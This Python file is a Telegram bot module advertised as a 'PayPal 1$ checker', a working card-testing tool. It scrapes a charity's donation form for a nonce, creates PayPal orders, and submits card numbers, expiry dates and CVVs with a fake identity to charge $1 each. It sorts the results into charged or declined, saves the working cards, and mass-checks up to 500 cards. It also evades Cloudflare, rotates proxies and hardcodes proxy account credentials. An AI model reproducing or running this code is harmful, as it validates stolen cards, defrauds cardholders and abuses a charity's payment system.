# py1_commands.py - PayPal 1$ Checker Integration

from telethon import events, Button
import asyncio
import httpx
import time
import os
import re
import json
import random
import string
import cloudscraper

# --- Globals ---
client = None
utils = {}
ACTIVE_MPY1TXT_PROCESSES = {}
CUSTOM_PROXY = None

# Proxy configuration
proxies = {
    "http": "http://brd-customer-hl_4200bd7a-zone-datacenter_proxy1:x98d5ul2oxob@brd.superproxy.io:33335",
    "https": "http://brd-customer-hl_4200bd7a-zone-datacenter_proxy1:x98d5ul2oxob@brd.superproxy.io:33335"
}

USE_PROXY = False  # Set to True to use proxy

# Helper function
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# --- Core API Function ---
async def check_py1_api(card):
    """PayPal 1$ checker using travelforimpact.com"""
    try:
        cc, mm, yy, cvv = card.split('|')
        if len(yy) == 4: yy = yy[2:]
        if len(mm) == 1: mm = f"0{mm}"
        
        start_time = time.time()
        
        # Generate random data
        name = 'john wills'
        address = "1830 E Parks Hwy"
        city = 'Wasilla'
        postal_code = '99654'
        state = 'OR'
        chars = string.ascii_lowercase + string.digits
        username = ''.join(random.choice(chars) for _ in range(10))
        email = username + "@gmail.com"
        
        # Use cloudscraper
        session = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        
        # Step 1: Get form
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = session.get('https://travelforimpact.com/donate', headers=headers)
        
        if 'cloudflare' in response.text.lower():
            return {"status": "Error", "message": "Cloudflare blocked", "time": 0}
        
        form_id = gets(response.text, 'post_type=give_forms&#038;p=', "'")
        if not form_id:
            return {"status": "Error", "message": "Cannot access form", "time": 0}
        
        # Step 2: Get nonce
        params = {'givewp-route': 'donation-form-view', 'form-id': form_id, 'locale': 'en_US'}
        response = session.get('https://travelforimpact.com/', params=params, headers=headers)
        
        nonce = gets(response.text, '"donationFormNonce":"', '",')
        if not nonce:
            return {"status": "Error", "message": "Cannot get nonce", "time": 0}
        
        # Step 3: Create PayPal order
        headers['content-type'] = 'multipart/form-data'
        files = {
            'give-form-id': (None, '8792'),
            'give-form-hash': (None, nonce),
            'give_payment_mode': (None, 'paypal-commerce'),
            'give-amount': (None, '1'),
            'give_first': (None, name),
            'give_last': (None, city),
            'give_email': (None, email),
        }
        
        response = session.post(
            'https://travelforimpact.com/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_create_order'},
            headers=headers,
            files=files
        )
        
        order_id = gets(response.text, 'ata":{"id":"', '"}')
        if not order_id:
            return {"status": "Error", "message": "Order creation failed", "time": 0}
        
        # Step 4: Submit payment
        headers = {
            'content-type': 'application/json',
            'paypal-client-context': order_id,
            'paypal-client-metadata-id': order_id,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'type': 'VISA',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': postal_code,
                    'securityCode': cvv,
                },
                'phoneNumber': '4459578565',
                'firstName': name,
                'lastName': city,
                'billingAddress': {
                    'givenName': name,
                    'familyName': city,
                    'line1': address,
                    'city': city,
                    'state': state,
                    'postalCode': postal_code,
                    'country': 'US',
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
        }
        
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
        
        time_taken = round(time.time() - start_time, 2)
        
        # Parse response
        result_code = gets(response.text, '"code":"', '"')
        result_message = gets(response.text, '"message":"', '"')
        
        if 'approveGuestPaymentWithCreditCard' in response.text and '"cart"' in response.text and 'error' not in response.text.lower():
            return {"status": "Charged", "message": "Payment Successful 🎉", "time": time_taken}
        elif result_code:
            error_messages = {
                'CARD_GENERIC_ERROR': 'Card Declined',
                'INVALID_BILLING_ADDRESS': 'Invalid Billing Address',
                'CARD_DECLINED': 'Card Declined by Bank',
                'INSUFFICIENT_FUNDS': 'Insufficient Funds',
                'INVALID_CVV': 'Invalid CVV Code',
                'EXPIRED_CARD': 'Card Expired',
            }
            message = error_messages.get(result_code, result_code)
            if result_message and result_message != result_code:
                message = f"{message} - {result_message}"
            return {"status": "Declined", "message": message, "time": time_taken}
        else:
            return {"status": "Declined", "message": result_message or "Unknown Error", "time": time_taken}
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "Error", "message": str(e), "time": 0}

# --- Single Check (/py1) ---
async def process_py1_card(event):
    card = utils['extract_card'](event.raw_text) or (await utils['extract_card']((await event.get_reply_message()).text) if event.is_reply and await event.get_reply_message() else None)
    if not card: return await event.reply("⚠️ **Invalid Card Format!**\n\n**Command:** `/py1 card|mm|yy|cvv`\n**Example:** `/py1 5264711024978225|12|2027|735`\n\n📌 Reply to any message with card info to check it.")

    # Live progress animation
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    loading_msg = await event.reply(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ Checking ■□□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    
    # Update progress
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ Checking ■■□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass
    
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ Checking ■■■□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass
    
    # Now check the card
    res = await check_py1_api(card)
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    response_msg = res.get("message", "Unknown")
    time_taken = res.get("time", 0)
    
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"

    if status == "Charged":
        msg = f"""⍟━━━⌁ **APPROVED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Approved ✅
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ {response_msg}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {time_taken}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    elif status == "Declined":
        msg = f"""⍟━━━⌁ **DECLINED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Declined ❌
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ {response_msg}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    else:
        msg = f"""⍟━━━⌁ **ERROR** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Error ⚠️
[🝂] **GATE** ⌁ PayPal 1$ CVV
[🝂] **RESPONSE** ⌁ {response_msg}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    
    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if status == "Charged": await utils['pin_charged_message'](event, result_msg)

# --- Mass Check (/mpy1) ---
async def process_mpy1_cards(event, cards):
    sent_msg = await event.reply(f"""💎 **MASS CHARGE INITIATED**

⚡ Processing {len(cards)} cards...
🔥 PayPal 1$ Gateway Active...""")
    
    charged_count = 0
    declined_count = 0
    
    for card in cards:
        res = await check_py1_api(card)
        status = res.get("status")
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
        message = res.get("message")
        time_taken = res.get("time", 0)
        
        if status in ["Charged"]:
            charged_count += 1
            await utils['save_approved_card'](card, "CHARGED (PY1)", message, "PayPal 1$ Gateway", "1.00$")
            
            card_msg = f"""APPROVED ✅

Card: {card}
Status: {message}
Gateway: PayPal 1$

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ {time_taken}s"""
            result_msg = await event.reply(card_msg)
            await utils['pin_charged_message'](event, result_msg)
        else:
            declined_count += 1
            card_msg = f"""DECLINED ❌

Card: {card}
Gateway: PayPal 1$
Response: {message}

BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}"""
            await event.reply(card_msg)
        
        await asyncio.sleep(3)  # 3 second delay to avoid API killing
    
    # Summary like Momo Ayase
    summary = f"""Mass_Results ({len(cards)} cards)
Gate: PayPal 1$
Stats: ✅ {charged_count} | ❌ {declined_count} | ⚠️ 0
Time: {len(cards) * 8}s"""
    
    await sent_msg.edit(f"```{summary}```")

# --- Event Handler Registration ---
async def py1_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_py1_card(event))

async def mpy1_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    replied_msg = await event.get_reply_message() if event.is_reply else None
    cards = utils['extract_all_cards'](replied_msg.text if replied_msg and replied_msg.text else event.raw_text)
    if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙥𝙮1 5414...|01|25|123 5414...|02|26|321")
    if len(cards) > 500:
        original_count = len(cards)
        cards = cards[:500]
        await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
    asyncio.create_task(process_mpy1_cards(event, cards))

async def proxy_command(event):
    """Add custom proxy for PayPal 1$"""
    global CUSTOM_PROXY, USE_PROXY
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await event.reply("""⚙️ **Add Custom Proxy**

**Format:** `/proxy ip:port:user:pass`
**Example:** `/proxy 123.45.67.89:8080:user:pass`

**Supported formats:**
• `ip:port:user:pass`
• `ip:port`
• `user:pass@ip:port`

Current proxy: """ + (CUSTOM_PROXY if CUSTOM_PROXY else "None"))
    proxy_str = parts[1].strip()
    
    # Test proxy
    test_msg = await event.reply("🔍 **Testing proxy...**")
    
    try:
        import httpx
        # Parse proxy format
        if "@" in proxy_str:
            # Format: user:pass@ip:port
            auth, endpoint = proxy_str.split("@")
            user, password = auth.split(":")
            ip, port = endpoint.split(":")
        elif proxy_str.count(":") == 3:
            # Format: ip:port:user:pass
            parts = proxy_str.split(":")
            ip, port, user, password = parts
        else:
            # Format: ip:port
            ip, port = proxy_str.split(":")
            user, password = None, None
        
        # Test proxy with httpx
        proxy_url = f"http://{user}:{password}@{ip}:{port}" if user else f"http://{ip}:{port}"
        async with httpx.AsyncClient(proxies=proxy_url, timeout=10.0) as client_http:
            response = await client_http.get("https://api.ipify.org?format=json")
            if response.status_code == 200:
                proxy_ip = response.json().get("ip")
                CUSTOM_PROXY = proxy_url
                USE_PROXY = True
                await test_msg.edit(f"""✅ **Proxy Added Successfully!**

🔗 **Proxy IP:** {proxy_ip}
⚡ **Status:** Active
🌐 **Endpoint:** {ip}:{port}

All PayPal 1$ checks will now use this proxy!""")
            else:
                await test_msg.edit("❌ **Proxy Test Failed!**\n\nProxy is not responding. Please check your proxy details.")
    except Exception as e:
        await test_msg.edit(f"❌ **Proxy Error!**\n\n{str(e)}\n\nPlease check your proxy format and try again.")

async def proxyon_py1_command(event):
    global USE_PROXY
    USE_PROXY = True
    await event.reply("✅ **Proxy Enabled for PayPal 1$!**\n\n🔗 Endpoint: " + (CUSTOM_PROXY if CUSTOM_PROXY else "brd.superproxy.io:33335") + "\n⚡ All PayPal 1$ requests will now use proxy.")

async def proxyoff_py1_command(event):
    global USE_PROXY
    USE_PROXY = False
    await event.reply("⚠️ **Proxy Disabled for PayPal 1$!**\n\n⚡ Using direct connection (proxyless).")

async def proxystatus_py1_command(event):
    status = "ON ✅" if USE_PROXY else "OFF ❌"
    proxy_endpoint = CUSTOM_PROXY if CUSTOM_PROXY else "brd.superproxy.io:33335"
    await event.reply(f"""🔧 **PayPal 1$ Proxy Status**

⚡ Status: {status}
🔗 Endpoint: {proxy_endpoint if USE_PROXY else "Direct Connection"}

💡 Use /proxy to add custom proxy
💡 Use /proxyon_py1 or /proxyoff_py1 to toggle""")

def register_handlers(_client, _utils):
    global client, utils
    client, utils = _client, _utils
    client.on(events.NewMessage(pattern=r'(?i)^[/.]py1$'))(py1_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mpy1'))(mpy1_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy'))(proxy_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]proxyon_py1$'))(proxyon_py1_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]proxyoff_py1$'))(proxyoff_py1_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]proxystatus_py1$'))(proxystatus_py1_command)
    print("✅ Successfully registered PY1, MPY1, PROXY commands (PayPal 1$).")
